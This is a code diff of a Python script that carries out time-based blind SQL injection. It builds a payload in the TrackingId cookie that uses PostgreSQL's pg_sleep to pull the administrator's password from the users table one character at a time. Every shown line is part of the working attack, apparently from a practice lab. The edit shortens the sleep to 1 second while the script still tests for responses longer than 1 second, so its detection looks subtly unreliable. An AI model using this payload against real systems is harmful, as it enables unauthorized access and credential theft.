@@ -14,7 +14,7 @@ password_length = 20
 while len(password) < password_length:
     position = len(password) + 1
     for alp in alphabet: 
-        payload = f"{trackingId}'||(select case when(substring((select password from users where username='administrator'),{position},1)='{alp}') then pg_sleep(3) else pg_sleep(0) end)--"
+        payload = f"{trackingId}'||(select case when(substring((select password from users where username='administrator'),{position},1)='{alp}') then pg_sleep(1) else pg_sleep(0) end)--"
         request = requests.get(url, cookies = {"TrackingId": payload, "session": session} )
         if  request.elapsed.total_seconds() > 1:
             password = password + alp
